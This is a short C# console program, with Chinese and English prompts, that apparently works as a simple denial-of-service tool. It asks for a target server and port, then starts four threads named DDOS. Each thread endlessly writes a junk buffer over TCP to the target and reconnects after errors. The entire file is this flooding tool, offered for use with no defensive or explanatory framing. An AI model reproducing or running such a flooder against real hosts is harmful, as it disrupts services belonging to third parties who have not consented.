using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

class Program {
    public static string IP;
    public static int Port;
    public static int count = 0;
    static void Main() {
        Console.Write("服务器    |  Server: ");
        Program.IP = Console.ReadLine();
        while (true) {
            Console.Write("端口      |  Port  : ");
            if (int.TryParse(Console.ReadLine(), out Program.Port)) {
                break;
            } else {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("端口不正确|  Invalid input");
                Console.ResetColor();
            }
        }
        Thread t1 = new Thread(DDOS);
        Thread t2 = new Thread(DDOS);
        Thread t3 = new Thread(DDOS);
        Thread t4 = new Thread(DDOS);
        t1.Start();
        t2.Start();
        t3.Start();
        t4.Start();
    }
    static void DDOS() {
        string serverIP = Program.IP;
        int serverPort = Program.Port;
        reclient:
        TcpClient client = new TcpClient();
        try {
            client.Connect(serverIP, serverPort);
            Console.WriteLine("服务器连接成功  |  Connect success.");
        } catch (Exception e) {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("服务器连接失败  |  Unable to connect to server.");
            Console.ResetColor();
        }
        NetworkStream stream = client.GetStream();
        byte[] buffer = System.Text.Encoding.ASCII.GetBytes("DataDataDataDataDataData");
        while (true) {
            Program.count++;
            try {
                stream.Write(buffer, 0, buffer.Length);
                Console.Write("发了第" + Program.count + "次包");
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("成功");
                Console.ResetColor();
            } catch (Exception e) {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("在发送第" + Program.count + "时发送问题" + e.Message);
                Console.ResetColor();
                goto reclient;
            }
        }
    }
}
